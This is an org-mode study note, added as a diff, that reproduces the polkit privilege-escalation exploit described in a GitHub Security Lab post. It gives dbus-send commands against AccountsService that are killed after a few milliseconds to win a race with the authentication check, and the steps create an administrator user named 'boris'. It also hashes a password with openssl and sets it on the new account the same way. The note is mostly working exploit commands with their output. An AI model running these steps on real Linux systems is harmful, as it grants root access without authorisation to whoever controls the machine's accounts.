@@ -1,0 +1,49 @@
+:PROPERTIES:
+:ID:       1c1126e1-62bd-41be-9075-71693b51c73f
+:END:
+#+title: polkit priv esc
+        #+created: [2025-02-27 Thu 09:35]
+        #+last_modified: [2025-02-27 Thu 09:35]
+From: https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/
+
+* Intel
+#+begin_src bash
+   pkexec reboot
+
+   # create a new user
+   dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1
+  #+end_src
+We want to ensure that ~accountsservice~ and ~gnome-control-center~ are installed.
+
+run our commands within an SSH session; ~ssh localhost~
+
+We want to run a ~dbus-send~, with an interrupt about half-way through
+      #+BEGIN_SRC bash
+   # dbus send interrupt
+   time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1
+#+END_SRC
+We first run the above once to get how long it takes to error out
+#+begin_src bash
+  Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+
+  real 0m0.016s
+  user 0m0.005s
+  sys 0m0.000s
+#+end_src
+* User creation
+We should be able to run this
+#+BEGIN_SRC bash
+  dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.008s ; kill $!
+#+END_SRC
+
+~id boris~ to see whether the user is created, mess around with the timer if not created
+** Password
+*** Hash
+#+BEGIN_SRC bash
+  openssl passwd -5 iaminvincible!
+#+END_SRC
+This will generate a hash that you can pass to dbus
+*** Send to dbus
+#+BEGIN_SRC bash
+  dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB' string:GoldenEye & sleep 0.008s ; kill $!
+#+END_SRC
